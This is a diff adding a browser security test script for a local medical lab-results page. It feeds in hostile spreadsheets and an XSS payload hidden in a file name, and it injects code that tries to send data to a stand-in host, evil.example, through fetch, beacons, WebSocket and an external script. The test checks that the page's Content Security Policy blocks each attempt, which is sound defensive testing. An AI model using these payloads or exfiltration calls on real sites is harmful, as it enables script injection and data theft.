@@ -1,0 +1,207 @@
+#!/usr/bin/env node
+// Browser security tests against the real built page (dist/index.html, opened
+// from file:// like a user would). Run after `npm run build`:
+//   node e2e/security.e2e.mjs
+// Needs Playwright with Chromium (CI installs it; see the workflow).
+import { mkdtempSync, rmSync, writeFileSync, readFileSync } from "node:fs";
+import { createRequire } from "node:module";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { fileURLToPath } from "node:url";
+import * as XLSX from "xlsx";
+
+const require = createRequire(import.meta.url);
+const { chromium } = require("playwright");
+
+const root = fileURLToPath(new URL("..", import.meta.url));
+const APP = `file://${join(root, "dist/index.html")}`;
+const FIX = (f) => join(root, "fixtures", f);
+const PASS = "correct horse battery";
+
+const results = [];
+const check = (name, ok, detail = "") => results.push({ name, ok: !!ok, detail });
+
+const tmp = mkdtempSync(join(tmpdir(), "portal-e2e-"));
+const context = await chromium.launchPersistentContext(join(tmp, "profile"), { locale: "en-GB" });
+
+/** A page with recorders for everything that could indicate a leak. */
+async function watchedPage() {
+  const page = await context.newPage();
+  const rec = { violations: [], errors: [], requests: [], responses: [], dialogs: [] };
+  page.on("console", (m) => {
+    const t = m.text();
+    if (/Content.Security|Trusted Type|Refused to/i.test(t)) rec.violations.push(t.slice(0, 160));
+    else if (m.type() === "error") rec.errors.push(t.slice(0, 160));
+  });
+  page.on("pageerror", (e) => rec.errors.push(String(e).slice(0, 160)));
+  page.on("request", (r) => !/^(file|data|blob):/.test(r.url()) && rec.requests.push(r.url()));
+  page.on("response", (r) => !/^(file|data|blob):/.test(r.url()) && rec.responses.push(r.url()));
+  page.on("dialog", (d) => {
+    rec.dialogs.push(d.message());
+    void d.dismiss();
+  });
+  await page.goto(APP);
+  return { page, rec };
+}
+
+const loaded = (page) =>
+  page.getByRole("button", { name: /^Report$|Doctor report/ }).first().waitFor({ timeout: 10_000 }).then(
+    () => true,
+    () => false,
+  );
+const xss = (page) => page.evaluate(() => window.__xss ?? null);
+const newFile = (page) => page.getByRole("button", { name: /New file/ }).click();
+
+try {
+  // 1. Normal use: every format loads, and nothing is blocked, failing or sent.
+  {
+    const { page, rec } = await watchedPage();
+    for (const f of ["sample_lab_results.xlsx", "realistic_lab_results.xlsx", "realistic_blood_cp1251.csv", "realistic_urine.numbers"]) {
+      await page.setInputFiles("#file-input", FIX(f));
+      const ok = await loaded(page);
+      if (ok) {
+        await page.locator("main button[aria-expanded]").nth(1).click();
+        await page.getByRole("button", { name: /^Report$/ }).first().click();
+        await page.getByRole("button", { name: /Back to dashboard/ }).click();
+        await newFile(page);
+      }
+      check(`loads ${f}`, ok);
+    }
+    check("normal use: no CSP/Trusted Types violations", rec.violations.length === 0, rec.violations.join(" | "));
+    check("normal use: no errors", rec.errors.length === 0, rec.errors.join(" | "));
+    check("normal use: no network requests", rec.requests.length === 0, rec.requests.join(" "));
+    await page.close();
+  }
+
+  // 2. Hostile files: nothing executes, nothing is requested, payloads show as text.
+  {
+    const { page, rec } = await watchedPage();
+    const hostileName = `<img src=x onerror="window.__xss=11">.xlsx`;
+    const files = [
+      FIX("hostile_markup.xlsx"),
+      FIX("hostile_html.xls"),
+      { name: hostileName, mimeType: "application/octet-stream", buffer: readFileSync(FIX("hostile_markup.xlsx")) },
+    ];
+    for (const f of files) {
+      const label = typeof f === "string" ? f.split("/").pop() : "hostile file name";
+      await page.setInputFiles("#file-input", f);
+      const ok = await loaded(page);
+      if (ok) {
+        for (const b of await page.locator("main button[aria-expanded=false]").all()) await b.click().catch(() => {});
+        await page.mouse.move(200, 300);
+        await page.getByRole("button", { name: /^Report$/ }).first().click();
+        await page.waitForTimeout(200);
+        await page.getByRole("button", { name: /Back to dashboard/ }).click();
+      }
+      check(`hostile: ${label} handled`, ok);
+      if (ok) await newFile(page);
+    }
+    await page.setInputFiles("#file-input", FIX("hostile_markup.xlsx"));
+    await loaded(page);
+    const text = await page.locator("body").innerText();
+    check("hostile: markup is shown as text", text.includes("<img src=x onerror="), "payload text not found");
+    await page.waitForTimeout(500);
+    check("hostile: no payload executed", (await xss(page)) === null && rec.dialogs.length === 0, `__xss=${await xss(page)}`);
+    check("hostile: no network requests", rec.requests.length === 0, rec.requests.join(" "));
+    await page.close();
+  }
+
+  // 3. An oversized file is refused (generated here to keep the repo small).
+  {
+    const { page } = await watchedPage();
+    const rows = [["Marker EN", "Reference", "2025-01-01"], ...Array.from({ length: 6_000 }, (_, i) => [`M${i}`, "<1", 0.5])];
+    const wb = XLSX.utils.book_new();
+    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(rows), "Blood");
+    await page.setInputFiles("#file-input", {
+      name: "too_many_rows.xlsx",
+      mimeType: "application/octet-stream",
+      buffer: XLSX.write(wb, { type: "buffer", bookType: "xlsx" }),
+    });
+    const alert = await page.getByRole("alert").innerText({ timeout: 15_000 }).catch(() => "");
+    check("oversized file is refused", /too big/i.test(alert), alert);
+    await page.close();
+  }
+
+  // 4–5. Code running in the page can't send data out, inject HTML, or eval.
+  {
+    const { page, rec } = await watchedPage();
+    await page.evaluate(() => {
+      window.__v = [];
+      window.addEventListener("securitypolicyviolation", (e) => window.__v.push(`${e.violatedDirective} ${e.blockedURI}`));
+      // Scheduled so it runs from the page's own event loop (DevTools evaluation is exempt from some checks).
+      setTimeout(async () => {
+        const r = {};
+        try { await fetch("https://evil.example/f"); r.fetch = "sent"; } catch { r.fetch = "blocked"; }
+        navigator.sendBeacon("https://evil.example/b", "data");
+        const img = new Image(); img.src = "https://evil.example/i.gif";
+        try { new WebSocket("wss://evil.example/w"); } catch { /* blocked */ }
+        try { document.body.insertAdjacentHTML("beforeend", "<img src=x onerror='window.__xss=1'>"); r.html = "inserted"; } catch { r.html = "blocked"; }
+        try { eval("1"); r.eval = "ran"; } catch { r.eval = "blocked"; }
+        try { const s = document.createElement("script"); s.src = "https://evil.example/s.js"; document.head.append(s); r.script = "added"; } catch { r.script = "blocked"; }
+        window.__attacks = r;
+      }, 0);
+    });
+    await page.waitForTimeout(1_000);
+    const r = await page.evaluate(() => window.__attacks);
+    const v = await page.evaluate(() => window.__v);
+    // Each attempt must be stopped by the CSP itself (a network failure alone doesn't count).
+    const blockedBy = (dir, url) => v.some((x) => x.startsWith(dir) && x.includes(url));
+    check("injected fetch is blocked by CSP", r?.fetch === "blocked" && blockedBy("connect-src", "evil.example/f"), v.join(","));
+    check("injected HTML is blocked (Trusted Types)", r?.html === "blocked");
+    check("eval is blocked", r?.eval === "blocked");
+    check("sendBeacon is blocked by CSP", blockedBy("connect-src", "evil.example/b"), v.join(","));
+    check("image beacon is blocked by CSP", blockedBy("img-src", "evil.example/i.gif"), v.join(","));
+    check("WebSocket is blocked by CSP", blockedBy("connect-src", "evil.example/w"), v.join(","));
+    check("external script is blocked by CSP", blockedBy("script-src", "evil.example/s.js") || r?.script === "blocked", v.join(","));
+    check("nothing reached the network", rec.responses.length === 0, rec.responses.join(" "));
+    await page.close();
+  }
+
+  // 6. Encrypted "remember": another local page sees only ciphertext.
+  {
+    const { page } = await watchedPage();
+    await page.getByRole("checkbox", { name: /Remember my last file/ }).check();
+    await page.getByLabel("Passphrase", { exact: true }).fill(PASS);
+    await page.getByLabel("Repeat passphrase").fill(PASS);
+    await page.getByRole("button", { name: "Turn on" }).click();
+    await page.getByText(/saved encrypted/).waitFor({ timeout: 15_000 });
+    await page.setInputFiles("#file-input", FIX("realistic_lab_results.xlsx"));
+    await loaded(page);
+    await page.waitForTimeout(1_000);
+
+    const otherHtml = join(tmp, "other-page.html");
+    writeFileSync(
+      otherHtml,
+      `<!doctype html><script>window.peek=()=>new Promise(res=>{const r=indexedDB.open("medical-portal",1);
+r.onupgradeneeded=()=>r.result.createObjectStore("files");r.onsuccess=()=>{const g=r.result.transaction("files").objectStore("files").get("last");
+g.onsuccess=()=>{const v=g.result;res(v?{keys:Object.keys(v).sort(),text:v.ct?new TextDecoder("latin1").decode(new Uint8Array(v.ct)):""}:null)}}})</script>`,
+    );
+    const other = await context.newPage();
+    await other.goto(`file://${otherHtml}`);
+    const seen = await other.evaluate(() => window.peek());
+    check("another local page can find the record", !!seen, "nothing stored?");
+    check(
+      "…but only ciphertext: no name, no bytes",
+      seen && seen.keys.join(",") === "ct,iterations,iv,kdf,salt,v" && !/realistic|xlsx|Blood|Marker|PK/.test(seen.text.slice(0, 4096)),
+      JSON.stringify(seen?.keys),
+    );
+    await other.close();
+
+    await page.reload();
+    await page.getByLabel("Passphrase", { exact: true }).fill("not the passphrase");
+    await page.getByRole("button", { name: "Open saved file" }).click();
+    check("wrong passphrase is refused", /Wrong passphrase/.test(await page.getByRole("alert").innerText()));
+    await page.getByLabel("Passphrase", { exact: true }).fill(PASS);
+    await page.getByRole("button", { name: "Open saved file" }).click();
+    check("right passphrase reopens the file", await loaded(page));
+    await page.close();
+  }
+} finally {
+  await context.close();
+  rmSync(tmp, { recursive: true, force: true });
+}
+
+const failed = results.filter((r) => !r.ok);
+for (const r of results) console.log(`${r.ok ? "✓" : "✗"} ${r.name}${!r.ok && r.detail ? ` — ${r.detail}` : ""}`);
+console.log(`\n${results.length - failed.length}/${results.length} security checks passed`);
+process.exit(failed.length ? 1 : 0);
